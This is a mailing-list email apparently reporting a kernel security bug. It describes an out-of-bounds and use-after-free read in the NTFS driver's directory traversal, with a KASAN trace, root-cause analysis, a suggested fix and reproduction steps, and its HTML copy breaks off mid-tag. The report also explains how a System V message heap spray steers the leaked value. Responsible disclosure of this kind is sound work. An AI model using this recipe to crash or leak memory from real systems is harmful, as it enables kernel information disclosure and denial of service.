Received: from mx.hiro.moe (mx.hiro.moe [118.91.186.92])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 88E93231827
	for <linux-fsdevel@vger.kernel.org>; Sun, 28 Jun 2026 08:05:13 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=118.91.186.92
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1782633917; cv=none; b=Jp2ak6+iqLi5R2ZCZ2P1ILjeS+WTv6ywwmG3db8GLpa5k6myZqp+sXoIjIFrMu3a0UdzIY+C+Mkik6/wwcmJlKm11cruOo/AIfNJKzbkJhp8cBiYkaGP9CViObmaabLIv3WZc3LoYlN3FvMTa6qr4+0lMxhH8tEmwwbINoERJq0=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1782633917; c=relaxed/simple;
	bh=AQB1pknceXE27QaPwEb3yHcsfS3Abcck9V6D0p3c3vs=;
	h=Content-Type:Message-ID:Date:MIME-Version:From:Subject:To:Cc; b=s+WxthZ43aRhgrjBR25NZa7Hz3AX8sFnPBRLZogNwTMywb2bUM32hSk8jUMOzYMUPZdd3RoMi7TtikOVoBZuhLtL0TT0X+zECYpVk/yjqV+w3ujlFKCG8wy084XH8Kzss1+wV8i4eXc8Y0rQpS6Xv8J7ZFB6BRKMSuBDBN6XPt8=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=bakabaka9.tech; spf=pass smtp.mailfrom=bakabaka9.tech; dkim=pass (2048-bit key) header.d=bakabaka9.tech header.i=@bakabaka9.tech header.b=pvqauhhS; arc=none smtp.client-ip=118.91.186.92
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=bakabaka9.tech
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=bakabaka9.tech
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=bakabaka9.tech header.i=@bakabaka9.tech header.b="pvqauhhS"
Received: from [127.0.0.1] (localhost [127.0.0.1]) by localhost (Mailerdaemon) with ESMTPSA id A7831C9F81;
	Sun, 28 Jun 2026 15:57:05 +0800 (CST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=bakabaka9.tech;
	s=dkim; t=1782633427;
	h=from:subject:date:message-id:to:cc:mime-version:content-type;
	bh=2ascJrPn0qeKt09UlVwQfpFQMgQ3YzYamHxXR1xV9ho=;
	b=pvqauhhSymRKFZEfl1r/7lP0MKyV/Y18KowaMQZrqy++KIiUQYvHXiriziq5Xwwog7y6jt
	AQZdL/wpaGzym4Yt628ds7q2cYMVHrHGFHbGrJTh5YfBsqlLp2htXP0n3xW4psbrALthOD
	V594zEggI7FoHY9gQssUsKfozxo433ewr9OpQoAgMP/dEHYMuIIVhJttuwqRSjNiXYxbwh
	FA3I2tTwAJWuT50XHCqFERkn8oeK43CzXAx4MaauUCQIlOmy3rLts20EADKYJwcIsU4F9u
	OpxXjI/Q+vFV2mRvYF9hrfC2Lb79RLX81nr3RDGH6nCMF0BtON+MYXzNr3fr4Q==
Content-Type: multipart/mixed; boundary="------------PKAyRUQcrx9vZxICRyyPyijE"
Message-ID: <d29fffa1-831b-4d35-8472-dc6098af9326@bakabaka9.tech>
Date: Sun, 28 Jun 2026 15:56:57 +0800
Precedence: bulk
X-Mailing-List: linux-fsdevel@vger.kernel.org
List-Id: <linux-fsdevel.vger.kernel.org>
List-Subscribe: <mailto:linux-fsdevel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-fsdevel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
From: Bakabaka_9 <baka9@bakabaka9.tech>
Subject: [REPORT] fs/ntfs: out-of-bounds / use-after-free read in
 ntfs_index_walk_down, via crafted directory index, readdir
To: linkinjeon@kernel.org, hyc.lee@gmail.com
Cc: linux-fsdevel@vger.kernel.org, security@kernel.org
X-Last-TLS-Session-Version: TLSv1.3

This is a multi-part message in MIME format.
--------------PKAyRUQcrx9vZxICRyyPyijE
Content-Type: multipart/alternative;
 boundary="------------l8MiwhB3SqgOKIhAvD4c0nu1"

--------------l8MiwhB3SqgOKIhAvD4c0nu1
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 8bit

Tree: git://git.kernel.org/pub/scm/linux/kernel/git/linkinjeon/ntfs.git
Affected: fs/ntfs (the in-kernel NTFS merged in the 7.1 cycle; NOT 
fs/ntfs3)
Version: v7.1-rc5 (commit e7ae89a0c97c "Linux 7.1-rc5")


  Summary

A crafted NTFS directory index triggers an out-of-bounds / 
use-after-free READ in ntfs_index_walk_down() during readdir(). The 
index-tree traversal helpers ntfs_index_next() / ntfs_index_walk_down() 
advance to the next index entry and read its child VCN 
/before/ validating that the entry lies within the index block. With a 
corrupted entry length the traversal pointer steps past the index block 
into an adjacent (and, depending on timing, freed) slab object, and the 
kernel dereferences it.

Reproducible deterministically under KASAN; mounting and listing a 
malicious image is sufficient. Reachable by anyone able to mount an NTFS 
image (removable-media automount as root on desktops that route NTFS to 
this driver; a user namespace + mount capability; etc.).


  Impact

Confirmed, with KASAN evidence:

  * Out-of-bounds read and use-after-free read of kernel slab memory
    (kmalloc-4096) -> kernel memory disclosure / KASLR defeat.
  * Denial of service (oops / BUG) on a range of corrupted images.

The contents of the read-back object are attacker-influenceable: 
spraying System V message bodies (kmalloc-4096) into the freed slot 
during the mount/list window makes the dereferenced VCN take an 
attacker-chosen value (verified: spray byte 0xMM -> VCN 0xMM..MM -> 
ntfs_ib_read pos = VCN<<bits).

We specifically investigated whether this can be turned into a 
controllable /write/ (to assess privilege escalation). It cannot, on 
this path: in ntfs_readdir() the write target ictx->ib is only ever 
freshly kvzalloc'd (index.c:1980), re-read in place, or 
kfree()'d-and-NULLed (walk_up, index.c:2031). The dangling/out-of-bounds 
pointer is exclusively the /read/ cursor |entry|. We confirmed this 
dynamically (57344 sprayed objects read back, 0 overwritten, 0 
write-type KASAN reports). So the realistic impact is kernel info-leak + 
DoS, not a self-contained LPE.

CVSS 3.1 (info-leak + DoS, attacker-supplied image, local/automount 
delivery): AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:H -> 7.0 (High)


  KASAN report

BUG: KASAN: use-after-free in ntfs_index_walk_down+0x167/0x230 Read of 
size 8 at addr ffff8881060e01ea by task ls/81 CPU: 0 ... 7.1.0-rc5 #2 
Call Trace: ntfs_index_walk_down+0x167/0x230 fs/ntfs/index.c:1978 
ntfs_index_next+0x9a/0x1c0 fs/ntfs/index.c:2117 
ntfs_readdir+0x86f/0x1150 iterate_dir+0xe9/0x250 
__x64_sys_getdents64+0xec/0x1b0 do_syscall_64+0xf9/0x540

A second, very similar splat is reachable at the same site as 
"slab-out-of-bounds in ntfs_index_walk_down+0x167" (the same cursor 
stepping just past the end of a still-allocated block instead of into a 
freed one).

ntfs_index_walk_down+0x167 corresponds to the VCN load:

fs/ntfs/index.c:1978 vcn = ntfs_ie_get_vcn(entry);

and ntfs_ie_get_vcn() reads 8 bytes at |entry + entry->length - 8|:

fs/ntfs/index.c:273-283 static __le64 *ntfs_ie_get_vcn_addr(struct 
index_entry *ie) { return (__le64 *)((u8 *)ie + le16_to_cpu(ie->length) 
- sizeof(s64)); }


  Root cause

The traversal advances and dereferences before bounds-checking.

ntfs_index_next() computes the next sibling purely from the (attacker- 
controlled) on-disk length and immediately dereferences it:

fs/ntfs/index.c:2105 next = (struct index_entry *)((char *)ie + 
le16_to_cpu(ie->length)); fs/ntfs/index.c:2107 flags = next->flags; 
fs/ntfs/index.c:2110 if (flags & INDEX_ENTRY_NODE) fs/ntfs/index.c:2117 
next = ntfs_index_walk_down(next, ictx);

ntfs_index_walk_down() then reads the child VCN of that unvalidated entry:

fs/ntfs/index.c:1978 vcn = ntfs_ie_get_vcn(entry); /* entry + len - 8 */

A correct per-entry bounds check /does/ exist 
(ntfs_index_entry_inconsistent(), fs/ntfs/index.c, which verifies 
ie_start <= ie and ie + ie->length < ih + index_length), and 
ntfs_readdir() even calls it — but only on the /result/, one step too late:

fs/ntfs/dir.c:924 next = ntfs_index_next(next, ictx); /* derefs first */ 
... fs/ntfs/dir.c:933 if (ntfs_index_entry_inconsistent(ictx, vol, next, 
...))

By the time line 933 runs, ntfs_index_next()/ntfs_index_walk_down() have 
already dereferenced |next|/|entry| at index.c:2107 and index.c:1978.

For comparison, the classic lookup path open-codes the right check 
/before/ each dereference while iterating entries:

fs/ntfs/dir.c:390-399 (bounds-checks ie against index_end every iteration)

The block-level check ntfs_index_block_inconsistent() (fs/ntfs/index.c, 
run inside ntfs_ib_read) only validates magic/VCN and index_length <= 
allocated_size <= block_size; it does NOT validate individual entry 
lengths, so a block can pass it yet contain an entry whose 
|length| walks the cursor out of the block.


  Suggested fix

Validate each entry against the current index block 
/before/ dereferencing it in the traversal helpers:

  * In ntfs_index_next(), after computing |next| (index.c:2105) and
    before reading next->flags, verify next lies within the index block
    and that next + next->length stays within ih + index_length (i.e.
    call ntfs_index_entry_inconsistent() / an inline bounds check there).
  * In ntfs_index_walk_down(), validate |entry| before
    ntfs_ie_get_vcn(entry) (index.c:1978), since ntfs_ie_get_vcn()
    dereferences entry + len - 8.
  * Consider having ntfs_ib_read()/ntfs_index_block_inconsistent()
    reject blocks whose entry chain does not exactly tile
    [entries_offset, index_length), so corrupted intra-block lengths are
    caught at read time.


  Reproduction

Tested in QEMU/KVM, x86-64, CONFIG_KASAN=y, v7.1-rc5.

 1.

    Build a clean image and apply a deterministic mutation: mkntfs -F -s
    512 -p 0 -H 0 -S 0 <16MiB file> # base.ntfs mutate base.ntfs
    poc.ntfs 1244 # flips 8..31 metadata bytes (mutate.c and the
    prebuilt base.ntfs/poc.ntfs are attached.)

 2.

    In the guest: mount -t ntfs -o loop,ro poc.ntfs /mnt ls -R /mnt ->
    KASAN use-after-free / slab-out-of-bounds read in
    ntfs_index_walk_down+0x167 (during getdents64).

The PoC image (poc.ntfs), the clean base (base.ntfs), the mutator 
(mutate.c), the heap-spray / read-back verifier used for the impact 
analysis (wproof.c), and the full KASAN logs are attached / available on 
request.


  Disclosure

Found via local fuzzing/auditing (by AI) as authorized security 
research. No prior public disclosure. Happy to test patches against the 
reproducer. Please advise whether you would like a CVE requested or 
prefer to handle assignment.

-- Bakabaka_9 (baka9@bakabaka9.tech)​

​
Two Large PoC File:

https://drive.google.com/file/d/1DugpNVdh2S-YG7Zwim1fYbOtPQUB9fVS/view?usp=sharing, 
https://drive.google.com/file/d/1VeW9dMeqT-4yCH81F7ClyTdt8qHIVNQX/view?usp=sharing


--------------l8MiwhB3SqgOKIhAvD4c0nu1
Content-Type: text/html; charset=UTF-8
Content-Transfer-Encoding: 8bit

<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  </head>
  <body>
    <div id=":rt" class="Am aiL Al editable LW-avf tS-tW tS-tY"
      aria-label="邮件正文" role="textbox" aria-multiline="true"
      contenteditable="true" tabindex="1"
      style="direction: ltr; min-height: 266px;" spellcheck="false"
      aria-owns=":ub" aria-controls=":ub" aria-expanded="false"><span
style="color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">Tree:
git://git.kernel.org/pub/scm/linux/kernel/git/linkinjeon/ntfs.git </span>
      <div><span
style="color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">Affected:
          fs/ntfs (the in-kernel NTFS merged in the 7.1 cycle; NOT
          fs/ntfs3) </span></div>
      <div><span
style="color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">Version:
          v7.1-rc5 (commit e7ae89a0c97c "Linux 7.1-rc5")</span></div>
      <div><span
style="color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);"><br>
        </span></div>
      <div>
        <h1
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 28px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); font-size: 22px; text-rendering: optimizelegibility; line-height: 28px; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; background-color: rgb(253, 253, 252);">Summary</h1>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">A
          crafted NTFS directory index triggers an out-of-bounds /
          use-after-free READ in ntfs_index_walk_down() during
          readdir(). The index-tree traversal helpers ntfs_index_next()
          / ntfs_index_walk_down() advance to the next index entry and
          read its child VCN <em
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility;">before</em> validating
          that the entry lies within the index block. With a corrupted
          entry length the traversal pointer steps past the index block
          into an adjacent (and, depending on timing, freed) slab
          object, and the kernel dereferences it.</p>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">Reproducible
          deterministically under KASAN; mounting and listing a
          malicious image is sufficient. Reachable by anyone able to
          mount an NTFS image (removable-media automount as root on
          desktops that route NTFS to this driver; a user namespace +
          mount capability; etc.).</p>
        <h1
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 28px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); font-size: 22px; text-rendering: optimizelegibility; line-height: 28px; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; background-color: rgb(253, 253, 252);">Impact</h1>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">Confirmed,
          with KASAN evidence:</p>
        <ul
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px 0px 0px 20px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); list-style: outside; text-rendering: optimizelegibility; gap: 6px; flex-direction: column; display: flex; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">
          <li
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility;">Out-of-bounds
            read and use-after-free read of kernel slab memory
            (kmalloc-4096) -&gt; kernel memory disclosure / KASLR
            defeat.</li>
          <li
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility;">Denial
            of service (oops / BUG) on a range of corrupted images.</li>
        </ul>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">The
          contents of the read-back object are attacker-influenceable:
          spraying System V message bodies (kmalloc-4096) into the freed
          slot during the mount/list window makes the dereferenced VCN
          take an attacker-chosen value (verified: spray byte 0xMM -&gt;
          VCN 0xMM..MM -&gt; ntfs_ib_read pos = VCN&lt;&lt;bits).</p>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">We
          specifically investigated whether this can be turned into a
          controllable <em
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility;">write</em> (to
          assess privilege escalation). It cannot, on this path: in
          ntfs_readdir() the write target ictx-&gt;ib is only ever
          freshly kvzalloc'd (index.c:1980), re-read in place, or
          kfree()'d-and-NULLed (walk_up, index.c:2031). The
          dangling/out-of-bounds pointer is exclusively the <em
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility;">read</em> cursor <code
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); font-family: &quot;Anthropic Mono&quot;, ui-monospace, monospace; font-feature-settings: &quot;calt&quot; 0, &quot;liga&quot; 0; font-variation-settings: normal; font-size: 12px; font-variant-ligatures: none; text-rendering: optimizelegibility; background: none 0% 0% / auto repeat scroll padding-box border-box rgba(10, 10, 10, 0.04); border-radius: 4px; padding-block: 1px; padding-inline: 2px; line-height: 1.4;">entry</code>.
          We confirmed this dynamically (57344 sprayed objects read
          back, 0 overwritten, 0 write-type KASAN reports). So the
          realistic impact is kernel info-leak + DoS, not a
          self-contained LPE.</p>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">CVSS
          3.1 (info-leak + DoS, attacker-supplied image, local/automount
          delivery): AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:H -&gt; 7.0
          (High)</p>
        <h1
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 28px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); font-size: 22px; text-rendering: optimizelegibility; line-height: 28px; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; background-color: rgb(253, 253, 252);">KASAN
          report</h1>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">BUG:
          KASAN: use-after-free in ntfs_index_walk_down+0x167/0x230 Read
          of size 8 at addr ffff8881060e01ea by task ls/81 CPU: 0 ...
          7.1.0-rc5 #2 Call Trace: ntfs_index_walk_down+0x167/0x230
          fs/ntfs/index.c:1978 ntfs_index_next+0x9a/0x1c0
          fs/ntfs/index.c:2117 ntfs_readdir+0x86f/0x1150
          iterate_dir+0xe9/0x250 __x64_sys_getdents64+0xec/0x1b0
          do_syscall_64+0xf9/0x540</p>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">A
          second, very similar splat is reachable at the same site as
          "slab-out-of-bounds in ntfs_index_walk_down+0x167" (the same
          cursor stepping just past the end of a still-allocated block
          instead of into a freed one).</p>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">ntfs_index_walk_down+0x167
          corresponds to the VCN load:</p>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">fs/ntfs/index.c:1978
          vcn = ntfs_ie_get_vcn(entry);</p>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">and
          ntfs_ie_get_vcn() reads 8 bytes at <code
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); font-family: &quot;Anthropic Mono&quot;, ui-monospace, monospace; font-feature-settings: &quot;calt&quot; 0, &quot;liga&quot; 0; font-variation-settings: normal; font-size: 12px; font-variant-ligatures: none; text-rendering: optimizelegibility; background: none 0% 0% / auto repeat scroll padding-box border-box rgba(10, 10, 10, 0.04); border-radius: 4px; padding-block: 1px; padding-inline: 2px; line-height: 1.4;">entry
            + entry-&gt;length - 8</code>:</p>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">fs/ntfs/index.c:273-283
          static __le64 *ntfs_ie_get_vcn_addr(struct index_entry *ie) {
          return (__le64 *)((u8 *)ie + le16_to_cpu(ie-&gt;length) -
          sizeof(s64)); }</p>
        <h1
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 28px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); font-size: 22px; text-rendering: optimizelegibility; line-height: 28px; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; background-color: rgb(253, 253, 252);">Root
          cause</h1>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">The
          traversal advances and dereferences before bounds-checking.</p>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">ntfs_index_next()
          computes the next sibling purely from the (attacker-
          controlled) on-disk length and immediately dereferences it:</p>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">fs/ntfs/index.c:2105
          next = (struct index_entry *)((char *)ie +
          le16_to_cpu(ie-&gt;length)); fs/ntfs/index.c:2107 flags =
          next-&gt;flags; fs/ntfs/index.c:2110 if (flags &amp;
          INDEX_ENTRY_NODE) fs/ntfs/index.c:2117 next =
          ntfs_index_walk_down(next, ictx);</p>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">ntfs_index_walk_down()
          then reads the child VCN of that unvalidated entry:</p>
        <p
style="box-sizing: border-box; border-width: 0px; border-style: solid; border-image: initial; margin: 0px 0px 16px; padding: 0px; outline-color: rgb(37, 107, 193); scrollbar-width: thin; scrollbar-color: rgba(31, 31, 30, 0.35) rgba(0, 0, 0, 0); text-rendering: optimizelegibility; color: rgb(10, 10, 10); font-family: &quot;Anthropic Sans&quot;, system-ui, &quot;Segoe UI&quot;, Roboto, Helvetica, Arial, sans-serif; font-size: 13px; background-color: rgb(253, 253, 252);">fs/ntfs/index.c:1978
          vcn = ntfs_ie_get_vcn(entry); /* entry + len - 8 */</p>
        <p
